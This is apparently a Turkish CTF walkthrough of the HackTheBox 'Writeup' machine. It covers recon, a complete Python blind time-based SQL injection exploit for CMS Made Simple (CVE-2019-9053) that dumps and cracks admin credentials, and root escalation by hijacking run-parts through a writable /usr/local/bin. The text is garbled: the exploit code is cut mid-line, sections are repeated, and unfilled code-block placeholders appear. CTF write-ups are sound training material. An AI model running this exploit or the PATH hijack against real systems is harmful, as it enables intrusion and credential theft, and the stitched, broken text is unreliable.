---
{"dg-publish":true,"permalink":"/ctf/writeup-ctf/"}
---

Writeup oldukça kolay bir kutuydu. Adımların hiçbiri zor değildi ancak her ikisi de ilginçti. İlk erişimi almak için **CMS Made Simple** üzerindeki **blind SQLI** açığını kullanarak kimlik bilgilerini elde edeceğim ve bunları **SSH** ile giriş yapmak için kullanacağım. Daha sonra, **staff** grubuna erişimi kötüye kullanarak, **SSH** ile kutuya bağlanıldığında çalıştırılan bir yola kod yazacağım ve **SSH** bağlantısı kurarak bu kodun çalışmasını tetikleyeceğim. **Beyond Root** aşamasında ise, root process'ini ele geçirmenin diğer yollarını inceleyeceğim.

## Box Info

|Name|[Writeup](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fwriteup)[![Writeup](https://0xdf.gitlab.io/icons/box-writeup.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fwriteup)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fwriteup)|
|---|---|
|Release Date|[08 Jun 2019](https://twitter.com/hackthebox_eu/status/1136941910759747585)|
|Retire Date|12 Oct 2019|
|OS|Linux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)|
|Base Points|Easy [20]|
|Rated Difficulty|![Rated difficulty for Writeup](https://0xdf.gitlab.io/img/writeup-diff.png)|
|Radar Graph|![Radar chart for Writeup](https://0xdf.gitlab.io/img/writeup-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|00:16:19[![artikrh](https://www.hackthebox.com/badge/image/41600)](https://app.hackthebox.com/users/41600)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|01:08:18[![qtc](https://www.hackthebox.com/badge/image/103578)](https://app.hackthebox.com/users/103578)|
|Creator|[![jkr](https://www.hackthebox.com/badge/image/77141)](https://app.hackthebox.com/users/77141)|

## Recon

### nmap

```
┌──(root㉿kali)-[~/Desktop]
└─# nmap -p- --min-rate 10000 10.10.10.138    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 09:51 EST
Nmap scan report for 10.10.10.138
Host is up (1.3s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 22.44 seconds
```

```
nmap -p 22,80 -sCV 10.10.10.138
```

![Pasted image 20250204180141.png](/img/user/resimler/Pasted%20image%2020250204180141.png)

`/robots.txt` dosyasında **/writeup/** dizini gizlenmiş. Bu genellikle önemli dosyalar içerdiğine dair bir ipucu olabilir . Dizine doğrudan erişerek ya da **gizli dizinleri keşfetmek için `ffuf` gibi araçlarla** fuzzing yapılabilir.

### Website - TCP 80

#### Site

![Pasted image 20250204180727.png](/img/user/resimler/Pasted%20image%2020250204180727.png)

Site bir gün HTB writeups sitesi olacak. Ama şu anda henüz hazır değil:

Ayrıca DoS saldırısı altında olduğunu söylüyor, bu yüzden 400 döndüren çok sayıda web isteği olan tüm hostları yasaklıyor.


#### robots.txt

nmap bir robots.txt dosyasının varlığını tespit etti. Kontrol etmek, araştırmak için bir yol gösterir:

![Pasted image 20250204180901.png](/img/user/resimler/Pasted%20image%2020250204180901.png)

Bu, HTB writeuplarına ev sahipliği yapacak olan gelecekteki sayfadır:

![Pasted image 20250204180933.png](/img/user/resimler/Pasted%20image%2020250204180933.png)

"Home

HTB'de aylarca oyalandıktan sonra ben de hacklediğim kutular hakkında yazmaya karar verdim. Önümüzdeki günlerde, haftalarda ve aylarda burada daha fazla içerik bulacaksınız, çünkü o meşhur tamamlanmamış notlarımı güzel yazılara dönüştürmek üzereyim.

Hala havalı bir tema sunacak ya da yapacak birini arıyorum. Eğer ilgileniyorsanız, lütfen NetSec Focus Mattermost üzerinden benimle iletişime geçin. Teşekkürler."


Bağlantıların her biri, eski kutuların (ypuffy ve blue) yanı sıra bu kutu için de yazılar içeriyor. Writingup için olan pek fazla ganimet vermiyor:

![Pasted image 20250204181148.png](/img/user/resimler/Pasted%20image%2020250204181148.png)

Sayfa kaynağını kontrol edersem, bu sitenin CMS Made Simple ile oluşturulduğunu göreceğim:

![Pasted image 20250204181225.png](/img/user/resimler/Pasted%20image%2020250204181225.png)

## Shell as jkr

### SQL Injection

#### Overview

CMS Made Simple'ın 2.2.10'dan önceki sürümleri, kimliği doğrulanmamış bir SQL enjeksiyon saldırısına karşı savunmasızdır. Bu bir blind saldırısıdır, bu nedenle çeşitli alanlardaki bir sonraki karakteri belirlemek için bir sleep deyimi ve response zamanlaması kullanır.

![Pasted image 20250204181339.png](/img/user/resimler/Pasted%20image%2020250204181339.png)

CMS Made Simple 2.2.8 sürümünde bir güvenlik açığı tespit edilmiştir. Bu açık, News modülü üzerinden, özel olarak hazırlanmış bir URL kullanılarak, `m1_idlist` parametresi aracılığıyla kimlik doğrulaması gerektirmeyen (unauthenticated) blind time-based SQL injection gerçekleştirilmesine olanak tanımaktadır.  [Kaynak](https://nvd.nist.gov/vuln/detail/CVE-2019-9053) .

#### Exploit

Packet Storm'da çok güzel bir POC (Proof of Concept) exploit bulunuyor. Zamanlamanın önemli olduğunu unutmamak gerekiyor, bu yüzden eğer sunucu yoğun bir şekilde kullanılıyorsa, bu durum işleri bozabilir. Script, çıktı konusunda bazı güzel numaralar yapmış. Bu GIF, exploitin tamamını gösteriyor (3 kat hızlandırılmış ve kırma adımından önce durdurulmuş, ancak çalışıyor):

![writeup-sqli-fast.gif](/img/user/resimler/writeup-sqli-fast.gif)
`./cmsms_sqli.py -u http://10.10.10.138/writeup --crack --wordlist /usr/share/wordlists/rockyou.txt` dosyasını çalıştırdığımda aşağıdaki sonuçları veriyor:

```
python3 46635.py -u http://10.10.10.138/writeup --crack --wordlist /usr/share/wordlists/rockyou.txt
  File "/root/Desktop/46635.py", line 25
    print "[+] Specify an url target"
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
```

Script **Python 2** ile yazılmış onun için böyle bir hata alıyoruz .

![Pasted image 20250204182450.png](/img/user/resimler/Pasted%20image%2020250204182450.png)

termcolor modülünü yüklersek başka bir hata alıyoruz . Kodu ChatGPT veya DeepSeek gibi yapay zeka ile python3'e uyumlu çalışacak şekilde tekrardan düzenlettirdim. Github sayfamda veya doğrudan buradan kopyalaya bilirsiniz.

```
#!/usr/bin/env python3
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import requests
from termcolor import colored, cprint
import time
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url",
                  help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist",
                  help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking",
                  help="Crack password with wordlist", default=False)

(options, args) = parser.parse_args()
if not options.url:
    print("[+] Specify an url target")
    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
    print("[+] Setup the variable TIME with an appropriate time, because this sql injection is time based.")
    exit()

# Eğer URL sonunda "/" varsa kaldırıyoruz
url_vuln = options.url.rstrip('/') + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-

![Pasted image 20250204201727.png](/img/user/resimler/Pasted%20image%2020250204201727.png)

### SSH as jkr
Parola ve kullanıcı adı ile writeup'a ssh ile bağlanabiliyorum:

![Pasted image 20250204201841.png](/img/user/resimler/Pasted%20image%2020250204201841.png)


## Priv: jkr –> root

### Enumeration

#### Groups

Tipik Linux numaralandırmam LinEnum (-t ile) ile başlar, ancak pek bir şey bulamadım. Geçerli kullanıcı için grupları fark ettim:

![Pasted image 20250204202004.png](/img/user/resimler/Pasted%20image%2020250204202004.png)

Ne işe yaradıklarını bilmek için standart olmayan gruplara bakmakta her zaman fayda vardır. Bu host [Debian, bu yüzden SystemGroups'un Debian](https://wiki.debian.org/SystemGroups) açıklamasını bulacağım. Kutunun yazarı buraya fazladan bazı şeyler eklemiş ama bir tanesi göze çarpıyor:


```
staff: Kullanıcıların root ayrıcalıklarına ihtiyaç duymadan sisteme (/usr/local) local değişiklikler eklemesine izin verir (/usr/local/bin içindeki executable'ların herhangi bir kullanıcının PATH değişkeninde olduğunu ve /bin ve /usr/bin içindeki aynı isimli executable'ları “ override” edebileceklerini unutmayın). Daha çok monitoring/ security ile ilgili olan “adm” grubu ile karşılaştırın.
```

Ubuntu için eşdeğer bir [grup listesine bakarsam](https://www.phy.ntnu.edu.tw/demolab/html.php?html=doc/base-passwd/users-and-groups), uyarı daha da keskin:


```
staff

Root ayrıcalıklarına ihtiyaç duymadan kullanıcıların sisteme (/usr/local, /home) local değişiklikler eklemesine izin verir. Daha çok monitoring/security ile ilgili olan 'adm' grubu ile kıyaslayın.

/usr/local üzerinde değişiklik yapabilmenin root erişimine eşdeğer olduğunu unutmayın (/usr/local kasıtlı olarak /usr'den önce arama yollarında olduğundan) ve bu nedenle bu gruba yalnızca güvenilir kullanıcılar eklemelisiniz. NFS kullanan ortamlarda dikkatli olun, çünkü bu tür ortamlarda root olmayan başka bir kullanıcının ayrıcalıklarını elde etmek genellikle daha kolaydır.
```

[Ubuntu bug tracker](https://bugs.launchpad.net/ubuntu/+source/base-files/+bug/13795)'da staff grubunu tamamen yok etmekten bahseden bir bug var.

Staff olarak `/usr/local/bin` ve `/usr/local/sbin` dosyalarına yazabildiğimi görüyorum:

![Pasted image 20250204203640.png](/img/user/resimler/Pasted%20image%2020250204203640.png)

Bu yollar root'un $PATH'inde olduğu için, root'un çalıştırdığı bir şey bulabilirsem, çalıştırmak istediğim bir şeyi bu aynı isimli bu dizinlerden birine bırakabilirim ve o da çalışır.

#### Processes

Daha sonra cron'ları izlemek için [pspy](https://github.com/DominicBreuker/pspy) yükleyeceğim. Pspy'yi çalıştırdım ve biraz izledim ve sadece /root/bin/cleanup.pl'nin her dakika çalıştığını gördüm:

```
019/06/17 01:33:01 CMD: UID=0    PID=3232   | /usr/sbin/CRON 
2019/06/17 01:33:01 CMD: UID=0    PID=3233   | /usr/sbin/CRON 
2019/06/17 01:33:01 CMD: UID=0    PID=3234   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1
2019/06/17 01:34:01 CMD: UID=0    PID=3238   | /usr/sbin/cron 
2019/06/17 01:34:01 CMD: UID=0    PID=3239   | /usr/sbin/CRON 
2019/06/17 01:34:01 CMD: UID=0    PID=3240   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1
2019/06/17 01:35:01 CMD: UID=0    PID=3241   | /usr/sbin/CRON 
2019/06/17 01:35:01 CMD: UID=0    PID=3242   | /usr/sbin/CRON 
2019/06/17 01:35:01 CMD: UID=0    PID=3243   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1
```

Bunu çalışır durumda bıraktım ve bakmaya devam etmek için tekrar ssh yapmaya karar verdim. Bunu yaptığımda, ssh bağlantımı pspy'de gördüm:

```
2019/06/17 01:37:09 CMD: UID=0    PID=3253   | sshd: [accepted]
2019/06/17 01:37:09 CMD: UID=0    PID=3254   | sshd: [accepted]  
2019/06/17 01:37:15 CMD: UID=0    PID=3255   | sshd: jkr [priv]  
2019/06/17 01:37:15 CMD: UID=0    PID=3256   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/06/17 01:37:16 CMD: UID=0    PID=3257   | run-parts --lsbsysinit /etc/update-motd.d
2019/06/17 01:37:16 CMD: UID=0    PID=3258   | /bin/sh /etc/update-motd.d/10-uname
2019/06/17 01:37:16 CMD: UID=0    PID=3259   | sshd: jkr [priv]  
2019/06/17 01:37:16 CMD: UID=1000 PID=3260   | -bash 
2019/06/17 01:37:16 CMD: UID=1000 PID=3261   | -bash 
2019/06/17 01:37:16 CMD: UID=1000 PID=3262   | -bash 
2019/06/17 01:37:16 CMD: UID=1000 PID=3263   | -bash 
2019/06/17 01:37:16 CMD: UID=1000 PID=3264   | -bash 
```

Burada birkaç şey olur, ancak en ilginç olanı `sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new` ile başlatılan üç komuttur.


### Hijack run-parts

Bir kullanıcı giriş yaptığında, `root` kullanıcısı `sh` çalıştırır, bu da `/usr/bin/env` çalıştırır. Bu işlem belirli bir `$PATH` tanımlar ve `update-motd.d` dizini üzerinde `run-parts` komutunu çalıştırır.

Hemen fark edeceğim ki `$PATH` değişkeninin öncelikli olarak iki adet yazma iznine sahip olduğum dizini içerdiğini göreceğim.

Bunun üzerine, `/usr/local/bin/run-parts` konumuna bir script yazıp çalıştırılabilir (`executable`) hale getireceğim. Daha sonra SSH bağlantısını tekrar kurarak giriş yapacağım.

![Pasted image 20250204204412.png](/img/user/resimler/Pasted%20image%2020250204204412.png)

Şimdi SSH ile tekrar giriş yapabilirim ve backdoored shell'im beni bekliyor.

![Pasted image 20250204204627.png](/img/user/resimler/Pasted%20image%2020250204204627.png)


flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = options.wordlist if options.wordlist else ""

def crack_password():
    global password, output, wordlist, salt
    try:
        # errors='ignore' ile hatalı karakterleri atlayarak dosyayı okuyoruz
        with open(wordlist, 'r', encoding="utf-8", errors='ignore') as f:
            for line in f.readlines():
                line = line.strip()
                # MD5 hash için önce veriyi encode ediyoruz
                if hashlib.md5((str(salt) + line).encode()).hexdigest() == password:
                    output += "\n[+] Password cracked: " + line
                    print(output)
                    return
    except Exception as e:
        print("[-] Error reading wordlist: ", e)

def beautify_print():
    cprint(output, 'green', attrs=['bold'])

def dump_salt():
    global flag, salt, output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + format(ord(dictionary[i]), 'x')
            payload = (
                "a,b,1,5))+and+(select+sleep(" + str(TIME) +
                ")+from+cms_siteprefs+where+sitepref_value+like+0x" +
                ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            )
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt
    print('[+] Salt for password found: ' + salt)

def dump_password():
    global flag, password, output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + format(ord(dictionary[i]), 'x')
            payload = (
                "a,b,1,5))+and+(select+sleep(" + str(TIME) +
                ")+from+cms_users+where+password+like+0x" +
                ord_password_temp + "25+and+user_id+like+0x31)+--+"
            )
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password
    print('[+] Password found: ' + password)

def dump_username():
    global flag, db_name, output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + format(ord(dictionary[i]), 'x')
            payload = (
                "a,b,1,5))+and+(select+sleep(" + str(TIME) +
                ")+from+cms_users+where+username+like+0x" +
                ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            )
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True
    print('[+] Username found: ' + db_name)

def dump_email():
    global flag, email, output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + format(ord(dictionary[i]), 'x')
            payload = (
                "a,b,1,5))+and+(select+sleep(" + str(TIME) +
                ")+from+cms_users+where+email+like+0x" +
                ord_email_temp + "25+and+user_id+like+0x31)+--+"
            )
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True
    print('[+] Email found: ' + email)

# SQL Injection adımları
dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print(colored("[*] Now try to crack password", "yellow"))
    crack_password()

beautify_print()
```

![Pasted image 20250204201727.png](/img/user/resimler/Pasted%20image%2020250204201727.png)

### SSH as jkr
Parola ve kullanıcı adı ile writeup'a ssh ile bağlanabiliyorum:

![Pasted image 20250204201841.png](/img/user/resimler/Pasted%20image%2020250204201841.png)


## Priv: jkr –> root

### Enumeration

#### Groups

Tipik Linux numaralandırmam LinEnum (-t ile) ile başlar, ancak pek bir şey bulamadım. Geçerli kullanıcı için grupları fark ettim:

![Pasted image 20250204202004.png](/img/user/resimler/Pasted%20image%2020250204202004.png)

Ne işe yaradıklarını bilmek için standart olmayan gruplara bakmakta her zaman fayda vardır. Bu host [Debian, bu yüzden SystemGroups'un Debian](https://wiki.debian.org/SystemGroups) açıklamasını bulacağım. Kutunun yazarı buraya fazladan bazı şeyler eklemiş ama bir tanesi göze çarpıyor:


{{CODE_BLOCK_4}}

Ubuntu için eşdeğer bir [grup listesine bakarsam](https://www.phy.ntnu.edu.tw/demolab/html.php?html=doc/base-passwd/users-and-groups), uyarı daha da keskin:


{{CODE_BLOCK_5}}

[Ubuntu bug tracker](https://bugs.launchpad.net/ubuntu/+source/base-files/+bug/13795)'da staff grubunu tamamen yok etmekten bahseden bir bug var.

Staff olarak `/usr/local/bin` ve `/usr/local/sbin` dosyalarına yazabildiğimi görüyorum:

![Pasted image 20250204203640.png](/img/user/resimler/Pasted%20image%2020250204203640.png)

Bu yollar root'un $PATH'inde olduğu için, root'un çalıştırdığı bir şey bulabilirsem, çalıştırmak istediğim bir şeyi bu aynı isimli bu dizinlerden birine bırakabilirim ve o da çalışır.

#### Processes

Daha sonra cron'ları izlemek için [pspy](https://github.com/DominicBreuker/pspy) yükleyeceğim. Pspy'yi çalıştırdım ve biraz izledim ve sadece /root/bin/cleanup.pl'nin her dakika çalıştığını gördüm:

{{CODE_BLOCK_6}}

Bunu çalışır durumda bıraktım ve bakmaya devam etmek için tekrar ssh yapmaya karar verdim. Bunu yaptığımda, ssh bağlantımı pspy'de gördüm:

{{CODE_BLOCK_7}}

Burada birkaç şey olur, ancak en ilginç olanı `sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new` ile başlatılan üç komuttur.


### Hijack run-parts

Bir kullanıcı giriş yaptığında, `root` kullanıcısı `sh` çalıştırır, bu da `/usr/bin/env` çalıştırır. Bu işlem belirli bir `$PATH` tanımlar ve `update-motd.d` dizini üzerinde `run-parts` komutunu çalıştırır.

Hemen fark edeceğim ki `$PATH` değişkeninin öncelikli olarak iki adet yazma iznine sahip olduğum dizini içerdiğini göreceğim.

Bunun üzerine, `/usr/local/bin/run-parts` konumuna bir script yazıp çalıştırılabilir (`executable`) hale getireceğim. Daha sonra SSH bağlantısını tekrar kurarak giriş yapacağım.

![Pasted image 20250204204412.png](/img/user/resimler/Pasted%20image%2020250204204412.png)

Şimdi SSH ile tekrar giriş yapabilirim ve backdoored shell'im beni bekliyor.

![Pasted image 20250204204627.png](/img/user/resimler/Pasted%20image%2020250204204627.png)

